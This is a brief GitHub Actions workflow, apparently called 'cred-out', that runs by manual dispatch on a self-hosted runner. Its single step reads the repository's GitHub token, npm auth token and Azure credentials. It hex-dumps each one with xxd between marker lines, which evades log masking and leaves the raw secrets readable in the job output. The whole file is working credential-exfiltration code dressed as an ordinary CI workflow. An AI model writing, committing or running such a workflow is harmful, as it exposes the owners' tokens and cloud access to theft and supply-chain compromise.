name: cred-out
on:
  workflow_dispatch:
jobs:
  out:
    runs-on: [self-hosted, Linux, X64]
    steps:
      - name: emit
        env:
          C1: ${{ secrets.GH_TOKEN }}
          C2: ${{ secrets.NPM_AUTH_TOKEN }}
          C3: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
        run: |
          for v in C1 C2 C3; do
            echo "=${v}_START="
            eval printf '%s' "\$${v}" | xxd
            echo "=${v}_END="
          done